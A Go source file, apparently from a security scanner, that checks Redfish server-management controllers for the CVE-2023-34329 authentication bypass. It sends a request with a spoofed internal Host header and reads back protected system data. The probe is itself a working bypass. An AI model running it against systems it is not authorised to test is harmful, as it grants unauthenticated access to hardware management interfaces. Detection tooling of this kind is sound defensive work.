package redfish

import (
	"context"
	"io"
	"net/http"
	"time"
)

const cve34329InternalIP = "169.254.0.17"

type CVE202334329Result struct {
	Vulnerable   bool
	PlainStatus  int
	SpoofStatus  int
	Path         string
	Snippet      string
	SpoofHeaders map[string]string
}

func CheckCVE202334329(host string, port int, timeout time.Duration) CVE202334329Result {
	base := baseURL(host, port)
	client := insecureClient(nil, timeout)
	const path = "/redfish/v1/Systems"
	url := base + path

	res := CVE202334329Result{Path: path}

	plainStatus, _ := authGet(client, url, nil, timeout)
	res.PlainStatus = plainStatus

	spoof := map[string]string{
		"Host": cve34329InternalIP,
	}
	res.SpoofHeaders = spoof
	spoofStatus, spoofBody := getWithSpoofHost(client, url, spoof, timeout)
	res.SpoofStatus = spoofStatus
	res.Snippet = bypassSnippet(spoofBody)
	res.Vulnerable = cve34329Verdict(plainStatus, spoofStatus, spoofBody)
	return res
}

func cve34329Verdict(plainStatus, spoofStatus int, spoofBody []byte) bool {
	if plainStatus >= 200 && plainStatus < 300 {
		return false
	}
	if spoofStatus < 200 || spoofStatus >= 300 {
		return false
	}
	return looksLikeRedfish(spoofBody) && !looksLikeLogin(spoofBody)
}

func getWithSpoofHost(c *http.Client, url string, headers map[string]string, timeout time.Duration) (int, []byte) {

	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
	if err != nil {
		return 0, nil
	}
	for k, v := range headers {
		if k == "Host" {
			req.Host = v
			continue
		}
		req.Header.Set(k, v)
	}
	resp, err := c.Do(req)
	if err != nil {
		return 0, nil
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 262144))
	return resp.StatusCode, body
}
